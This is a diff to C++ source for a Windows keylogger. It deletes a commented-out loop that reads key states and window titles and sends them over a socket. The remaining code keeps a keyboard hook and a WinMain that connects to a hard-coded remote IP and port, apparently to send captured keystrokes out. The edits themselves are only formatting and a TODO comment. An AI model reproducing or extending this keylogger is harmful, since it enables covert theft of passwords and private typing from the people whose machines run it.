@@ -14,61 +14,10 @@ bool	running;	/* Used in main loop */
 std::net::TcpClient client;
 std::net::IPAddress ip("94.61.54.47", 3000);
 
-/*int main(int argc, char **argv)
-{
-	
-
-
-
-	/*while (true)
-	{
-		std::string lastTitle = "";
-		std::stringstream stream;
-		//SHORT lastc = 0;
-		while (true) 
-		{
-			// get the active windowtitle
-			char title[2048];
-			HWND hwndHandle = GetForegroundWindow();
-			GetWindowText(hwndHandle, title, 2048);
-			if (lastTitle != title) 
-			{
-				stream << std::endl << std::endl << "Window: ";
-				strlen(title) == 0 ? stream << "NO ACTIVE WINDOW" : stream << "'" << title << "'" << std::endl;
-				lastTitle = title;
-			}
-
-			// logging keys, thats the keylogger
-			for (unsigned char c = 1; c < 255; c++) 
-			{
-				SHORT rv = GetAsyncKeyState(c);
-				if (rv & 1) // on press button down
-					stream << (int)c << " ";
-			}
-
-			std::string data = stream.str();
-			if (data.size() > 0)
-			{
-				std::cout << data;
-				if (send(soc, data.c_str(), data.size(), 0) == SOCKET_ERROR)
-				{
-					break;
-				}
-				stream.str(std::string());
-			}
-		}
-	}*
-}*/
-
-
-
-
-
-
-
 __declspec(dllexport) LRESULT CALLBACK handlekeys(int code, WPARAM wp, LPARAM lp)
 {
-	if (code == HC_ACTION && (wp == WM_SYSKEYDOWN || wp == WM_KEYDOWN)) {
+	if (code == HC_ACTION && (wp == WM_SYSKEYDOWN || wp == WM_KEYDOWN)) 
+	{
 		static bool capslock = false;
 		static bool shift = false;
 		char tmp[0xFF] = { 0 };
@@ -223,7 +172,7 @@ int WINAPI WinMain(HINSTANCE thisinstance, HINSTANCE previnstance, LPSTR cmdline
 	running = true;
 
 	std::net::Initialize();
-	client.Connect(ip);
+	client.Connect(ip); // TODO: VoidNet, set timeout
 
 	while (running && client.GetConnectionState() == std::net::SocketConnectionState::Connected)
 	{
